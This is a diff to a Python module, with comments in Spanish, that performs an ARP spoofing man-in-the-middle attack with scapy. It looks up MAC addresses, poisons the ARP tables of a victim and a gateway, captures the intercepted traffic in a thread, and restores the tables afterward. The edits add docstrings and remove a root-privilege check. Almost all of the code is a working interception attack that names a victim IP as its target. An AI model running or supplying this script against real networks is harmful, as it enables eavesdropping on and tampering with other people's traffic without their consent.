@@ -1,20 +1,18 @@
 import scapy.all as scapy
 import time
-import os
 import threading
 from traffic_capture.capture import capture_traffic
-
-# Función para verificar si se ejecuta con privilegios de root
-def is_root():
-    return os.geteuid() == 0
 
 
 def get_mac(ip):
     """
     Obtiene la dirección MAC de una IP mediante una solicitud ARP.
+
+    :param ip: Dirección IP de la cual se quiere obtener la MAC.
+    :return: Dirección MAC correspondiente a la IP, o None si ocurre un error.
     """
     try:
-        request = scapy.ARP(pdst=ip) # Crea del paquete ARP para obtener la MAC de la IP destino
+        request = scapy.ARP(pdst=ip)
         broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
         final_packet = broadcast / request
         
@@ -31,6 +29,10 @@ def get_mac(ip):
 def spoofing(target_ip, spoofed_ip):
     """
     Envía paquetes ARP suplantando la identidad de 'spoofed_ip' hacia 'target_ip'.
+
+    :param target_ip: Dirección IP de destino a la cual se enviarán los paquetes ARP.
+    :param spoofed_ip: Dirección IP que se desea suplantar en los paquetes ARP.
+    :return: None
     """
     target_mac = get_mac(target_ip)
     if target_mac is None:
@@ -45,6 +47,10 @@ def spoofing(target_ip, spoofed_ip):
 def restore_defaults(dest_ip, source_ip):
     """
     Restaura las tablas ARP de la víctima y el router a su estado original.
+
+    :param dest_ip: Dirección IP del dispositivo cuyo ARP se debe restaurar.
+    :param source_ip: Dirección IP original asociada a la MAC en la tabla ARP.
+    :return: None
     """
     dest_mac = get_mac(dest_ip)
     source_mac = get_mac(source_ip)
@@ -57,14 +63,17 @@ def restore_defaults(dest_ip, source_ip):
     scapy.sendp(ethernet_packet, count=4, verbose=False)
 
 
-
 def mitm_attack(gateway_ip, victim_ip):
     """
     Función principal del ataque MITM (Man-in-the-Middle) utilizando ARP spoofing.
+
+    :param gateway_ip: Dirección IP del gateway (router) objetivo del ataque.
+    :param victim_ip: Dirección IP de la víctima objetivo del ataque.
+    :return: None
     """
     print(f"[+] Iniciando ataque MITM entre {gateway_ip} y {victim_ip}...")
 
-    stop_event = threading.Event() # Evento para detener un hilo
+    stop_event = threading.Event()  # Evento para detener un hilo
 
     try:
         # Se inicia la captura de tráfico en un hilo aparte
@@ -87,9 +96,3 @@ def mitm_attack(gateway_ip, victim_ip):
         restore_defaults(gateway_ip, victim_ip)
         restore_defaults(victim_ip, gateway_ip)
         print("[+] Tablas ARP restauradas. Volviendo al menú principal.")
-
-
-# Verificar si se está ejecutando como root
-if not is_root():
-    print("[!] Este ataque requiere privilegios de root.")
-    exit(1)
